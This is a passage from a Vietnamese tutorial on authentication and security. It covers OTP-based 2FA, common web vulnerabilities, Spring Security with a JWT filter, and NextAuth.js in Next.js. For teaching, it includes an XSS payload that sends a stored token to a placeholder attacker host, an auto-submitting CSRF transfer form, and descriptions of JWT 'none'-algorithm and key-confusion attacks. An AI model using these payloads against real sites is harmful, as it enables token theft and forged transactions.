        userRepository.save(user);

        // Tạo URL cho QR code
        String qrUrl = GoogleAuthenticatorQRGenerator.getOtpAuthTotpURL(
            "YourApp",          // app name
            user.getEmail(),    // user name
            key
        );

        return new TotpSetup(qrUrl, key.getKey());
    }

    // Verify OTP khi login
    public boolean verifyTotp(User user, int otpCode) {
        GoogleAuthenticator gAuth = new GoogleAuthenticator();
        String secret = decrypt(user.getTotpSecret());
        // Cho phép ±1 window (30s trước và sau) để bù timezone/clock drift
        return gAuth.authorize(secret, otpCode);
    }
}
```

## SMS OTP — Tiện Nhưng Kém An Toàn

SMS OTP phổ biến hơn nhưng có điểm yếu:

```
Rủi ro của SMS OTP:
  SIM swapping: attacker thuyết phục nhà mạng chuyển số sang SIM của họ
  SS7 attack: lỗ hổng trong mạng điện thoại cho phép intercept SMS
  Social engineering: attacker giả vờ là user để yêu cầu OTP

Vẫn tốt hơn không có 2FA
Nhưng TOTP (authenticator app) hay hardware key (YubiKey) an toàn hơn nhiều
```

---

# 12. Các Lỗ Hổng Phổ Biến Và Cách Phòng

## XSS — Cross-Site Scripting

Attacker inject JavaScript độc hại vào trang web. Script chạy trong browser của nạn nhân.

```
Tấn công:
  Attacker post comment: <script>fetch('https://evil.com?token='+localStorage.token)</script>
  Nạn nhân xem trang → script chạy → token bị gửi cho attacker

Phòng chống:
  Luôn escape/sanitize input trước khi hiển thị
  Content Security Policy (CSP) header → hạn chế script có thể chạy
  Không lưu token trong localStorage → dùng HttpOnly cookie
```

## CSRF — Cross-Site Request Forgery

Attacker lừa user gửi request không mong muốn đến trang web đang đăng nhập.

```
Tấn công:
  User đang đăng nhập bank.com (có cookie)
  User click link độc hại: evil.com có hidden form:
    <form action="https://bank.com/transfer" method="POST">
      <input name="to" value="attacker_account">
      <input name="amount" value="1000000">
    </form>
    <script>document.forms[0].submit()</script>
  Browser tự gửi cookie bank.com → transfer thật sự xảy ra!

Phòng chống:
  SameSite cookie attribute:
    SameSite=Strict → cookie không gửi khi request từ domain khác
    SameSite=Lax    → cookie không gửi với POST từ domain khác
  CSRF token: form có hidden token server verify
```

## Brute Force — Đoán Mật Khẩu

```
Phòng chống:
  Rate limiting theo IP và theo account: tối đa 5 lần sai/15 phút
  Account lockout tạm thời (nhưng tránh DoS: attacker lock tài khoản người khác)
  CAPTCHA sau một số lần sai
  Thông báo lỗi không tiết lộ email có tồn tại không:
    Sai: "Email không tồn tại"     ← attacker biết email nào hợp lệ
    Đúng: "Email hoặc mật khẩu không đúng"
```

## JWT Pitfalls

```
KHÔNG dùng algorithm "none":
  JWT cho phép header: { "alg": "none" }
  Server nhận token không có signature → accept bất kỳ claim nào
  Luôn verify algorithm và từ chối "none"

KHÔNG dùng alg=RS256 nhưng verify bằng HS256:
  RS256 = asymmetric (private key ký, public key verify)
  Attacker biết public key
  Attacker tạo token với alg=HS256, ký bằng public key
  Server verify HS256 bằng public key → accept!
  Luôn chỉ định thuật toán cụ thể khi verify

Verify expiration (exp claim):
  Luôn check exp, đừng chỉ verify signature
```

## Password Storage — Không Bao Giờ Lưu Plain Text

```
Sai: lưu mật khẩu trực tiếp → DB bị lộ = tất cả mật khẩu lộ

Sai: lưu MD5/SHA1 → rainbow table dễ crack

Đúng: BCrypt, Argon2, scrypt
  Các thuật toán này:
  - Có salt ngẫu nhiên (mỗi user khác nhau, cùng mật khẩu → hash khác)
  - Chậm có chủ ý → brute force tốn nhiều CPU/thời gian
  - Cost factor điều chỉnh được → tăng khi hardware mạnh hơn
```

```java
@Configuration
public class SecurityConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt với strength 12 — đủ chậm để brute force khó
        // Mỗi năm nên tăng strength khi hardware mạnh hơn
        return new BCryptPasswordEncoder(12);
    }
}

// Lưu mật khẩu
user.setPassword(passwordEncoder.encode(rawPassword));

// Verify mật khẩu
boolean matches = passwordEncoder.matches(rawPassword, user.getPassword());
```

---

# 13. Spring Security — Triển Khai Thực Tế

## Cấu Hình Cơ Bản

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity  // cho phép @PreAuthorize trên method
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // Tắt CSRF cho stateless API (có JWT)
            // Nếu dùng session, GIỮ CSRF bật
            .csrf(csrf -> csrf.disable())

            // Không dùng session (stateless vì JWT)
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // Quy tắc authorization
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()       // login, register công khai
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN") // chỉ ADMIN
                .requestMatchers(HttpMethod.GET, "/products/**").permitAll() // đọc thoải mái
                .anyRequest().authenticated()                  // tất cả còn lại cần auth
            )

            // Thêm JWT filter trước UsernamePasswordAuthenticationFilter
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)

            // Xử lý lỗi auth
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(customAuthEntryPoint)   // 401
                .accessDeniedHandler(customAccessDeniedHandler)   // 403
            );

        return http.build();
    }
}
```

## JWT Filter

```java
@Component
@RequiredArgsConstructor
public class JwtAuthFilter extends OncePerRequestFilter {

    private final JwtService jwtService;
    private final UserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain chain) throws Exception {
        // Lấy token từ header: "Authorization: Bearer eyJ..."
        String authHeader = request.getHeader("Authorization");

        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            chain.doFilter(request, response);
            return;
        }

        String token = authHeader.substring(7);

        if (!jwtService.isTokenValid(token)) {
            chain.doFilter(request, response);
            return;
        }

        String userId = jwtService.extractUserId(token);
        UserDetails userDetails = userDetailsService.loadUserByUsername(userId);

        // Đặt authentication vào SecurityContext
        UsernamePasswordAuthenticationToken auth =
            new UsernamePasswordAuthenticationToken(
                userDetails, null, userDetails.getAuthorities());
        auth.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
        SecurityContextHolder.getContext().setAuthentication(auth);

        chain.doFilter(request, response);
    }
}
```

## Authorization — Role và Permission

```java
// Cách 1: Trong SecurityConfig (URL-based)
.requestMatchers("/admin/**").hasRole("ADMIN")
.requestMatchers("/api/**").hasAnyRole("USER", "ADMIN")

// Cách 2: @PreAuthorize trên method (expression-based, linh hoạt hơn)
@Service
public class OrderService {

    @PreAuthorize("hasRole('USER')")
    public Order createOrder(CreateOrderRequest req) { ... }

    @PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
    public List<Order> getUserOrders(Long userId) { ... }
    // Admin xem tất cả, hoặc user chỉ xem của mình

    @PreAuthorize("hasAuthority('order:delete')")  // permission-based
    public void deleteOrder(Long orderId) { ... }
}

// Cách 3: Kiểm tra trong code
@GetMapping("/orders/{id}")
public ResponseEntity<Order> getOrder(@PathVariable Long id) {
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    User currentUser = (User) auth.getPrincipal();

    Order order = orderService.findById(id);

    // User chỉ xem được order của mình
    if (!order.getUserId().equals(currentUser.getId())
            && !currentUser.hasRole("ADMIN")) {
        return ResponseEntity.status(403).build();
    }

    return ResponseEntity.ok(order);
}
```

---

# 14. Next.js — Auth Patterns Phổ Biến

## NextAuth.js (Auth.js) — Giải Pháp Toàn Diện

NextAuth.js là thư viện xử lý authentication cho Next.js. Hỗ trợ sẵn hàng chục OAuth providers (Google, GitHub, Facebook...) và nhiều kiểu lưu session.

```bash
npm install next-auth
```

```typescript
// app/api/auth/[...nextauth]/route.ts
import NextAuth from 'next-auth'
import GoogleProvider from 'next-auth/providers/google'
import CredentialsProvider from 'next-auth/providers/credentials'

const handler = NextAuth({
  providers: [
    // Social login với Google
    GoogleProvider({
      clientId: process.env.GOOGLE_CLIENT_ID!,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET!
    }),

    // Login bằng email/password
    CredentialsProvider({
      name: 'Credentials',
      credentials: {
        email: { label: 'Email', type: 'email' },
        password: { label: 'Password', type: 'password' }
      },
      async authorize(credentials) {
        // Gọi API backend để verify
        const response = await fetch(`${process.env.BACKEND_URL}/auth/login`, {
          method: 'POST',
          body: JSON.stringify(credentials),
          headers: { 'Content-Type': 'application/json' }
        })

        if (!response.ok) return null

        const user = await response.json()
        return user  // { id, name, email, role }
      }
    })
  ],

  callbacks: {
    // Thêm thông tin vào JWT token
    async jwt({ token, user }) {
      if (user) {
        token.userId = user.id
        token.role = user.role
      }
      return token
    },

    // Thêm thông tin vào session
    async session({ session, token }) {
      session.user.id = token.userId as string
      session.user.role = token.role as string
      return session
    }
  },

  pages: {
    signIn: '/login',    // trang đăng nhập custom
    error: '/auth/error' // trang lỗi custom
  },

  session: {
    strategy: 'jwt'      // lưu session trong JWT, không cần database
  }
})

export { handler as GET, handler as POST }
```

## Protect Route với Middleware

```typescript
// middleware.ts
import { withAuth } from 'next-auth/middleware'
import { NextResponse } from 'next/server'

export default withAuth(
  function middleware(req) {
    const token = req.nextauth.token
    const path = req.nextUrl.pathname

    // Chỉ ADMIN mới vào được /admin
    if (path.startsWith('/admin') && token?.role !== 'ADMIN') {
      return NextResponse.redirect(new URL('/unauthorized', req.url))
    }

    return NextResponse.next()
  },
  {
    callbacks: {
      authorized: ({ token }) => !!token  // cần có token thì mới vào
    }
  }
)

export const config = {
  matcher: ['/dashboard/:path*', '/admin/:path*', '/profile/:path*']
}
```

## Dùng Session Trong Component

```tsx
// Client Component
'use client'
import { useSession, signIn, signOut } from 'next-auth/react'

function Navbar() {
  const { data: session, status } = useSession()

  if (status === 'loading') return <div>Đang tải...</div>

  if (!session) {
    return <button onClick={() => signIn('google')}>Đăng nhập bằng Google</button>
  }

  return (
    <div>
      <img src={session.user.image} alt={session.user.name} />
      <span>{session.user.name}</span>
      <button onClick={() => signOut()}>Đăng xuất</button>
    </div>
  )
}
```

```tsx
// Server Component
import { getServerSession } from 'next-auth'
import { redirect } from 'next/navigation'

async function DashboardPage() {
  const session = await getServerSession()

  if (!session) {
    redirect('/login')
  }

  return <div>Xin chào {session.user.name}!</div>
}
```

---

## Tóm Tắt — Chọn Phương Pháp Nào?

```
SESSION-BASED:
  Dùng khi: web app server-rendered truyền thống
  Ưu: đơn giản, có thể logout thật sự
  Cần: shared session store (Redis) nếu nhiều server

JWT:
  Dùng khi: SPA, mobile app, microservices
  Ưu: stateless, scale dễ
  Nhớ: token ngắn hạn + refresh token, lưu HttpOnly cookie

OAUTH2 + OIDC:
  Dùng khi: cần social login, hoặc nhiều app dùng chung IdP
  Flow: Authorization Code (web server) hoặc + PKCE (SPA/mobile)

SSO:
  Dùng khi: enterprise, nhiều app nội bộ, user cần một lần đăng nhập
  Cần: Identity Provider (Keycloak, Okta, Azure AD)

API KEY:
  Dùng khi: developer integration, machine-to-machine
  Không dùng cho: user login

MFA/2FA:
  Nên bật cho: mọi tài khoản quan trọng
  TOTP (authenticator app) > SMS OTP

BẢO MẬT LUÔN NHỚ:
  Mật khẩu: BCrypt/Argon2, không MD5
  Token: HttpOnly cookie, không localStorage (trừ khi biết mình đang làm gì)
  HTTPS: bắt buộc
  Rate limiting: chống brute force
  Không tiết lộ: email có tồn tại không khi login thất bại
```
